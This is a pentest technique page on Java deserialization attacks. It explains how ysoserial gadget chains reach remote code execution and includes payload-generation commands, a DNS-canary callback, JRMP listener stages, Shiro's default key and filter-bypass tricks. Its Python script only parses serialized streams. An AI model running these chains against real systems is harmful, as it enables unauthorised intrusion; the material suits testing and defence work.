---
title: "Java Deserialization - ysoserial Gadget Chains from rO0AB to RCE"
category: web
subcategory: java
type: technique
tags: [java-deserialization, deserialization, readobject, serializable, ysoserial, gadget-chain, commonscollections, templatesimpl, urldns, jndi, rmi, jmx, t3-weblogic, shiro-rememberme, invokertransformer, jrmp, marshalsec, burp, ro0ab, aced0005]
difficulty: hard
summary: "A blob starting AC ED 00 05 (rO0AB) reaches readObject(); a ysoserial gadget chain built from the app's own classpath turns that into RCE."
when_to_use:
  - "A parameter, cookie or body starts with rO0AB, H4sIA, or raw bytes AC ED 00 05"
  - "The service speaks RMI (1099), JMX, JMS, T3/WebLogic (7001) or Jenkins CLI"
  - "A Shiro app sets a rememberMe cookie, or deleteMe appears in Set-Cookie"
  - "javax.faces.ViewState is base64 that does not decode to XML"
  - "You have an LFI/heapdump and can see commons-collections on the classpath"
tools: [ysoserial, marshalsec, burp, java-deserialization-scanner, gadgetinspector, python3]
cves: [CVE-2015-4852, CVE-2016-4437, CVE-2017-3248]
related: [deser-dotnet-viewstate, java-spring-spel-jndi, java-oauth-saml-flaws, deser-php-object-injection]
---

## TL;DR

`ObjectInputStream.readObject()` rebuilds an arbitrary object graph *before* anything checks
its type, so every `readObject`/`readResolve`/`readExternal` on the classpath is an entry
point. ysoserial stitches those side effects into a chain ending in `Runtime.exec` or in
loading attacker bytecode - the app only has to ship the right library.

## Recognise it

- Raw `AC ED 00 05` = `STREAM_MAGIC` 0xACED + `STREAM_VERSION` 5; base64 `rO0AB...`, hex
  `aced0005`. Gzip'd then base64'd (common in cookies): `H4sIA...` (`1f 8b 08`).
- Shiro: `Set-Cookie: rememberMe=deleteMe` on logout. The cookie is
  `base64(IV || AES-128-CBC(serialized))`, IV = first 16 bytes, and the historic default key
  `kPH+bIxk5D2deZiIxcaaaA==` shipped in the docs for years (CVE-2016-4437).
- JSF `javax.faces.ViewState` (MyFaces/Mojarra) that base64-decodes to `AC ED`, not XML.
- Spring HttpInvoker: `Content-Type: application/x-java-serialized-object`.
- Ports: 1099/1098/1090 RMI, 4444/4445 JRMP, 7001 WebLogic T3, 8686/9999 JMX, Jenkins
  `/cli` answering `<===[JENKINS REMOTING CAPACITY]===>`.
- Errors confirming the sink: `InvalidClassException`, `ClassNotFoundException`,
  `SerialVersionUID mismatch`, `StreamCorruptedException: invalid stream header`.

## Theory

**Stream grammar.** After the 4-byte header comes a sequence of tagged records:
`TC_NULL 0x70`, `TC_REFERENCE 0x71` (u4 handle), `TC_CLASSDESC 0x72`, `TC_OBJECT 0x73`,
`TC_STRING 0x74` (u2 len + UTF), `TC_ARRAY 0x75`, `TC_CLASS 0x76`, `TC_BLOCKDATA 0x77`
(u1 len), `TC_ENDBLOCKDATA 0x78`, `TC_RESET 0x79`, `TC_BLOCKDATALONG 0x7A` (u4 len),
`TC_EXCEPTION 0x7B`, `TC_LONGSTRING 0x7C` (u8 len), `TC_PROXYCLASSDESC 0x7D`,
`TC_ENUM 0x7E`. A `TC_CLASSDESC` is `u2 len + UTF class name`, `u8 serialVersionUID`,
`u1 flags` (`SC_WRITE_METHOD 0x01`, `SC_SERIALIZABLE 0x02`, `SC_EXTERNALIZABLE 0x04`,
`SC_BLOCK_DATA 0x08`, `SC_ENUM 0x10`), `u2 field count`, the fields (typecode + name, plus a
type string for `L`/`[`), the class annotation, then the superclass descriptor. Class names are plain UTF-8 here, so grepping them is a free classpath oracle, and a
`TC_PROXYCLASSDESC` (dynamic proxy) is a gadget-chain tell.

**Entry points.** Deserializing calls the class's private `readObject(ObjectInputStream)`,
then `readResolve()`, then `validateObject()`; an `Externalizable` class gets its public
no-arg constructor plus `readExternal()`. Whatever those do with attacker state is the trigger.

**Chain archetypes.** (1) *Proxy + transformer*: a `Map`'s `readObject` calls
`hashCode()`/`setValue()`, reaching `LazyMap.get()` -> `ChainedTransformer.transform()` ->
`ConstantTransformer(Runtime.class)` + `InvokerTransformer("getMethod"/"invoke"/"exec")` -
pure reflection. In CC1 the outer trigger is a `java.lang.reflect.Proxy` backed by
`sun.reflect.annotation.AnnotationInvocationHandler`, so any method call on the proxy fires
it. (2) *Bytecode loading*: `TemplatesImpl._bytecodes` holds a class
extending `AbstractTranslet`; any outer chain that calls `newTransformer()` or
`getOutputProperties()` makes `TransletClassLoader.defineClass()` run its static
initializer. That yields arbitrary Java rather than one `exec` - the answer when the
container has no shell.

**Why JDK version matters.** `AnnotationInvocationHandler.readObject` started validating
member types in 8u71, which kills CC1 and Jdk7u21. CC6 avoids that class entirely
(`HashSet` -> `TiedMapEntry` -> `LazyMap`), so CC6 is the JDK-independent default.

## Attack

**1. Prove the sink with URLDNS.** `URLDNS` is a `HashMap` holding a `java.net.URL`;
`HashMap.readObject` calls `hashCode()`, which resolves the host. No library, every JDK, no
code execution - pure detection. `java -jar ysoserial.jar URLDNS http://CANARY.example >
u.bin`, base64 it into the parameter, and watch your DNS canary. A hit proves
deserialization even when the response is a generic 500.

**2. Find the library.** `InvokerTransformer` is not in the JDK: enumerate `/WEB-INF/lib/`
via LFI, read a heapdump, harvest jar names from `/actuator/env`, or fire gadgets and watch
the error move from `ClassNotFoundException` to a timing or DNS signal.

**3. Pick the gadget.** `java -jar ysoserial.jar <Gadget> '<command>'` writes the stream to
stdout; the choice is dictated by the target's classpath and JDK.

| gadget | needs on classpath | JDK | notes |
|---|---|---|---|
| URLDNS | nothing | any | detection only, DNS callback |
| CommonsCollections1 | commons-collections 3.1-3.2.1 | **< 8u71** | AnnotationInvocationHandler proxy |
| CommonsCollections2 | commons-collections4 4.0 | any | PriorityQueue + TemplatesImpl |
| CommonsCollections3 | commons-collections 3.1-3.2.1 | < 8u71 | TemplatesImpl + TrAXFilter, no InvokerTransformer |
| CommonsCollections4 | commons-collections4 4.0 | any | CC2 with TrAXFilter |
| CommonsCollections5 | commons-collections 3.1-3.2.1 | any | BadAttributeValueExpException + TiedMapEntry |
| CommonsCollections6 | commons-collections 3.1-3.2.1 | **any** | HashSet + TiedMapEntry - default pick |
| CommonsCollections7 | commons-collections 3.1-3.2.1 | any | Hashtable hash-collision trigger |
| CommonsBeanutils1 | commons-beanutils 1.9.2 + commons-logging | any | BeanComparator + TemplatesImpl; ships inside Shiro |
| Groovy1 | groovy 2.3.x-2.4.3 | any | ConvertedClosure + MethodClosure |
| Spring1 | spring-core + spring-beans 4.1.4 | < 8u71 | ObjectFactory proxy |
| Spring2 | spring-core + spring-aop 4.1.4 | any | TemplatesImpl through an AOP proxy |
| Jdk7u21 | **nothing** | **<= 7u21** | LinkedHashSet + AnnotationInvocationHandler + TemplatesImpl |
| JRMPClient / JRMPListener | nothing | any | make the target dial a JRMP listener |
| Hibernate1 / Hibernate2 | hibernate-core (+ javassist) | any | TypedValue getter chain -> TemplatesImpl |
| Rome | rome 1.0 | any | ObjectBean / ToStringBean getter chain |
| C3P0 | c3p0 0.9.5.2 + mchange-commons | any | remote classloading from a codebase URL |
| Clojure | clojure 1.8.0 | any | AbstractTableModel$ff19274a |
| BeanShell1 | bsh 2.0b5 | any | XThis handler + Comparator |
| Click1 | click-nodeps 2.3.0 | any | Column comparator |
| Vaadin1 | vaadin-server/shared 7.7.14 | any | NestedMethodProperty getter |
| FileUpload1 | commons-fileupload 1.3.1 | any | file *write* (`write;<dir>;<file>`), not exec |
| MozillaRhino1 / 2 | js 1.7R2 / rhino 1.7.7 | any | NativeError getter chain |
| Myfaces1 / Myfaces2 | myfaces-impl | any | JSF EL / remote classloading |

**4. Second stage when no library fits.** `ysoserial.exploit.JRMPListener <port> <Gadget>
<cmd>` stands up a JRMP endpoint serving a payload built for the *target's* classpath; the
library-free `JRMPClient` gadget makes the target connect to it (and doubles as blind
detection). `ysoserial.exploit.RMIRegistryExploit <host> 1099 ...` does the same to an
exposed registry.

**5. Decision tree.**

```
reaches readObject?                  -> URLDNS, watch DNS; else JRMPClient, watch TCP
commons-collections 3.x / 4.x        -> CC6 (any JDK) > CC5 > CC1/CC3 (JDK < 8u71) / CC2, CC4
beanutils (Shiro, Jenkins) / spring  -> CommonsBeanutils1 / Spring2 (Spring1 if JDK < 8u71)
bare JDK <= 7u21 | nothing + egress  -> Jdk7u21 | JRMPClient + JRMPListener
exec blocked / no shell in the image -> any TemplatesImpl gadget: load a class instead
```

**6. Blind timing.** With no DNS and no egress, diff response times for a sleeping command
against a no-op one, or make deserialization itself slow (colliding `HashMap` keys).

## Code

```python
#!/usr/bin/env python3
"""Java serialized-stream fingerprinter: normalise raw/base64/gzip input, check
STREAM_MAGIC, walk the TC_* record grammar, print class descriptors + fields +
strings (a free classpath oracle for whatever sent the blob). Stdlib only.

  python3 javafp.py stream.bin ; echo 'rO0ABXNy...' | python3 javafp.py -
  python3 javafp.py              # no args: self-test
"""
from __future__ import annotations

import base64
import binascii
import gzip
import struct
import sys

STREAM_MAGIC = 0xACED
TC = {0x70: "TC_NULL", 0x71: "TC_REFERENCE", 0x72: "TC_CLASSDESC",
      0x73: "TC_OBJECT", 0x74: "TC_STRING", 0x75: "TC_ARRAY", 0x76: "TC_CLASS",
      0x77: "TC_BLOCKDATA", 0x78: "TC_ENDBLOCKDATA", 0x79: "TC_RESET",
      0x7A: "TC_BLOCKDATALONG", 0x7B: "TC_EXCEPTION", 0x7C: "TC_LONGSTRING",
      0x7D: "TC_PROXYCLASSDESC", 0x7E: "TC_ENUM"}
SC = [(0x01, "SC_WRITE_METHOD"), (0x02, "SC_SERIALIZABLE"),
      (0x04, "SC_EXTERNALIZABLE"), (0x08, "SC_BLOCK_DATA"), (0x10, "SC_ENUM")]


class Truncated(Exception):          # ran off the end of the buffer
    pass


class StreamParser:
    """Lenient best-effort walker of an ObjectOutputStream byte stream."""

    def __init__(self, data: bytes) -> None:
        self.d, self.i, self.version = data, 0, -1
        self.tokens: list[str] = []
        self.classes: list[dict] = []
        self.strings: list[str] = []

    def num(self, n: int) -> int:
        if self.i + n > len(self.d):
            raise Truncated()
        v = int.from_bytes(self.d[self.i:self.i + n], "big")
        self.i += n
        return v

    def utf(self) -> str:
        n = self.num(2)
        if self.i + n > len(self.d):
            raise Truncated()
        s, self.i = self.d[self.i:self.i + n].decode("utf-8", "replace"), self.i + n
        return s

    def skip(self, n: int) -> None:
        if self.i + n > len(self.d):
            raise Truncated()
        self.i += n

    def parse(self) -> None:
        if len(self.d) < 4:
            raise ValueError("too short to be a serialized stream")
        if int.from_bytes(self.d[:2], "big") != STREAM_MAGIC:
            raise ValueError("bad STREAM_MAGIC %s (want 0xaced)" % self.d[:2].hex())
        self.version = int.from_bytes(self.d[2:4], "big")
        self.i = 4
        while self.i < len(self.d):
            start = self.i
            try:
                self.element()
            except Truncated:
                self.tokens.append("TRUNCATED")
                break
            if self.i <= start:                  # never spin on junk
                self.i = start + 1

    def element(self) -> None:
        tag = self.d[self.i]
        name = TC.get(tag)
        if name is None:                         # raw primitive field data
            self.i += 1
            return
        if tag in (0x72, 0x7D):                  # descriptor at top level
            return self.class_desc()
        self.tokens.append(name)
        self.i += 1
        if tag in (0x73, 0x76, 0x7E):            # TC_OBJECT / TC_CLASS / TC_ENUM
            self.class_desc()
        elif tag == 0x75:                        # TC_ARRAY: desc then element count
            self.class_desc()
            self.num(4)
        elif tag in (0x74, 0x7C):                # TC_STRING / TC_LONGSTRING
            if tag == 0x74:
                self.strings.append(self.utf())
            else:
                n = self.num(8)
                self.strings.append(self.d[self.i:self.i + n].decode("utf-8", "replace"))
                self.skip(n)
        elif tag in (0x77, 0x7A):                # TC_BLOCKDATA / TC_BLOCKDATALONG
            self.skip(self.num(1 if tag == 0x77 else 4))
        elif tag == 0x71:                        # TC_REFERENCE -> 4-byte handle
            self.num(4)

    def class_desc(self) -> None:
        off = self.i
        tag = self.num(1)
        if tag == 0x70:                          # TC_NULL ends the super chain
            return self.tokens.append("TC_NULL")
        if tag == 0x71:                          # back-reference to an earlier desc
            self.tokens.append("TC_REFERENCE")
            self.num(4)
            return
        if tag == 0x7D:                          # TC_PROXYCLASSDESC
            ifaces = []
            for _ in range(self.num(4)):
                if self.num(1) != 0x74:
                    break
                ifaces.append(self.utf())
            self.classes.append({"name": "$Proxy", "suid": 0, "flags": 0,
                                 "ifaces": ifaces, "fields": []})
            self.tokens.append("TC_PROXYCLASSDESC")
        elif tag == 0x72:                        # TC_CLASSDESC
            name, suid, flags = self.utf(), self.num(8), self.num(1)
            fields = []
            for _ in range(self.num(2)):
                tc, fname = chr(self.num(1)), self.utf()
                if tc in "L[":                   # object field -> type string follows
                    t = self.num(1)
                    ftype = self.utf() if t == 0x74 else "<ref>"
                    if t == 0x71:
                        self.num(4)
                else:
                    ftype = tc
                fields.append((tc, fname, ftype))
            self.classes.append({"name": name, "suid": suid, "flags": flags,
                                 "ifaces": [], "fields": fields})
            self.tokens.append("TC_CLASSDESC")
        else:
            self.i = off                         # not a descriptor; let the loop retry
            return
        self.annotation()
        self.class_desc()                        # superClassDesc

    def annotation(self) -> None:
        """classAnnotation: block data up to TC_ENDBLOCKDATA."""
        while self.i < len(self.d):
            tag = self.d[self.i]
            if tag == 0x78:
                self.i += 1
                return self.tokens.append("TC_ENDBLOCKDATA")
            if tag not in (0x77, 0x7A):
                return                           # object inside annotation: bail out
            self.i += 1
            self.skip(self.num(1 if tag == 0x77 else 4))


def flag_names(flags: int) -> str:
    return "|".join(n for bit, n in SC if flags & bit) or "0"


def decode_blob(raw: bytes) -> bytes:
    """raw AC ED / base64 rO0AB / base64+gzip H4sIA -> serialized stream bytes."""
    data = raw.strip()
    if data[:2] != b"\xac\xed":
        s = data.decode("latin-1").replace("\n", "").replace("\r", "").strip()
        try:
            data = base64.b64decode(s + "=" * (-len(s) % 4))
        except (binascii.Error, ValueError):
            data = raw
    if data[:2] == b"\x1f\x8b":                  # gzip'd stream (base64 "H4sIA")
        data = gzip.decompress(data)
    return data


def report(data: bytes) -> str:
    p = StreamParser(data)
    p.parse()
    out = ["version %d, %d bytes, base64 head %s"
           % (p.version, len(data), base64.b64encode(data[:9]).decode())]
    for c in p.classes:
        out.append("%s%s suid=%#018x flags=%s"
                   % (c["name"], "".join(" implements " + i for i in c["ifaces"]),
                      c["suid"], flag_names(c["flags"])))
        out += ["    %s %s : %s" % f for f in c["fields"]]
    out += ["string: %r" % s[:100] for s in p.strings[:40]]
    return "\n".join(out)


def craft_minimal(class_name: str = "java.util.HashMap") -> bytes:
    """Smallest legal stream that names one class."""
    n = class_name.encode()
    return (struct.pack(">HH", STREAM_MAGIC, 5)        # magic + STREAM_VERSION
            + b"\x73\x72" + struct.pack(">H", len(n)) + n   # TC_OBJECT TC_CLASSDESC utf
            + struct.pack(">q", 362498820763181265)    # serialVersionUID
            + b"\x03" + struct.pack(">H", 0)           # flags, 0 fields
            + b"\x78\x70")                             # TC_ENDBLOCKDATA, TC_NULL


def _self_test() -> None:
    blob = craft_minimal()
    assert blob[:4] == b"\xac\xed\x00\x05"
    p = StreamParser(blob)
    p.parse()
    assert p.version == 5
    assert [c["name"] for c in p.classes] == ["java.util.HashMap"], p.classes
    assert flag_names(p.classes[0]["flags"]) == "SC_WRITE_METHOD|SC_SERIALIZABLE"
    assert {"TC_OBJECT", "TC_CLASSDESC", "TC_ENDBLOCKDATA", "TC_NULL"} <= set(p.tokens)
    b64 = base64.b64encode(blob).decode()
    assert b64.startswith("rO0AB"), b64[:10]     # the prefix you grep for
    assert decode_blob(b64.encode()) == blob == decode_blob(gzip.compress(blob))
    assert base64.b64encode(gzip.compress(blob)).decode().startswith("H4sIA")
    assert "InvokerTransformer" in report(craft_minimal(
        "org.apache.commons.collections.functors.InvokerTransformer"))
    assert "java.util.HashMap" in report(blob)
    try:
        StreamParser(b"\xde\xad\xbe\xef").parse()
    except ValueError as e:
        assert "STREAM_MAGIC" in str(e)
    else:
        raise AssertionError("bad magic must raise")
    print("[ok] java stream fingerprinter self-test passed")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        _self_test()
    else:
        raw = sys.stdin.buffer.read() if sys.argv[1] == "-" else open(sys.argv[1], "rb").read()
        print(report(decode_blob(raw)))
```

## Variants & pitfalls

- **`ClassNotFoundException: org.apache.commons.collections...` is good news**: the stream
  parsed, the class is just absent. Change gadget, not approach.
- **SerialVersionUID mismatch** = a different library version. commons-collections 3.2.2
  neutered `InvokerTransformer` (throws unless a system property is set): use CC4 or beanutils.
- **Look-ahead filters** (`ObjectInputFilter`/JEP 290, SerialKiller) blacklist class *names*:
  bypassed by an unlisted chain, or by nesting inside a `SignedObject` so a second,
  unfiltered `readObject` unpacks it. If the original blob was `H4sIA`, gzip yours too.
- **`Runtime.exec` is not a shell** - no pipes, redirection or `$()`; gadgets taking an
  argument array, or a `TemplatesImpl` class, sidestep that.
- **JSF ViewState** may be MAC'd with a framework default key (`org.apache.myfaces.SECRET`);
  if it decodes to `AC ED` it is a plain stream.
- **WebLogic T3** (CVE-2015-4852) needs the T3 handshake first and CVE-2017-3248 bypassed the
  initial blacklist via JRMP; Jenkins CLI frames the stream in its remoting protocol.
- **Class-name greps lie**: Jdk7u21 is built entirely from JDK classes, and proxies hide the
  real target behind `TC_PROXYCLASSDESC`. **Size**: CC6 ~1.5 KB, TemplatesImpl several KB.

## Tools

- `ysoserial` (frohoff) - gadget payloads plus `ysoserial.exploit.JRMPListener`,
  `JRMPClient` and `RMIRegistryExploit`.
- `marshalsec` - same idea for JSON/YAML/XML marshallers, plus `marshalsec.jndi.LDAPRefServer`.
- Burp `Java Deserialization Scanner` (DNS-canary active scan) and `Freddy`; `gadgetinspector`
  for new chains in a jar; `SerializationDumper` or the script above to read a stream byte by
  byte; `jd-gui`/`procyon`/`cfr` to confirm a candidate `readObject`.

## References

- frohoff/ysoserial - GitHub (gadget list and payload sources).
- "Marshalling Pickles" - Frohoff & Lawrence, AppSecCali 2015.
- Oracle Java Object Serialization Specification - stream grammar and TC_* constants.
- Apache Shiro security advisories - rememberMe cookie default key.
- PortSwigger Web Security Academy - Insecure deserialization labs.
